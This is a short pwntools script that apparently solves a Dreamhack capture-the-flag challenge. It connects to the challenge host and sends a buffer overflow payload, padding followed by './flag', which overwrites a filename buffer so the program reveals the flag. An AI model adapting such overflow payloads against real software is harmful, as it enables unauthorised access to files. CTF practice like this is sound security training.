from pwn import *

# p = process('./deploy/bof')
# p = remote('localhost', 31337)
p = remote("host3.dreamhack.games", 16203)

payload = b'A' * (0x90 - 0x10)
payload += b'./flag\x00'

p.sendlineafter(b'? ', payload)
p.interactive()
